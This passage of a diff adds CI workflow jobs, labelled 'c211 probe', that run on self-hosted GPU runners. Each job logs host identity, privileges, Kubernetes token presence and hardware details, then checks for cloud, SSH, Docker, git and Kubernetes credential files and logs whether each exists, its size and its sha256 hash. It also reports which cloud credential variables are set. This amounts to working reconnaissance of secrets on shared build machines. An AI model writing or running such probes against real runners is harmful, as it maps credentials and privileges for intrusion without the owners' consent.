+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=b200-03 nonce=$NONCE host=$(hostname)"
+  job-b200-04:
+    name: probe-b200-04
+    runs-on: [4-gpu-b200]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe b200-04
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=b200-04 NONCE=$NONCE"
+          echo "C211_MARKER job=b200-04 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=b200-04 nonce=$NONCE host=$(hostname)"
+  job-gb300-01:
+    name: probe-gb300-01
+    runs-on: [2-gpu-gb300]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe gb300-01
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=gb300-01 NONCE=$NONCE"
+          echo "C211_MARKER job=gb300-01 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=gb300-01 nonce=$NONCE host=$(hostname)"
+  job-gb300-02:
+    name: probe-gb300-02
+    runs-on: [2-gpu-gb300]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe gb300-02
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=gb300-02 NONCE=$NONCE"
+          echo "C211_MARKER job=gb300-02 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=gb300-02 nonce=$NONCE host=$(hostname)"
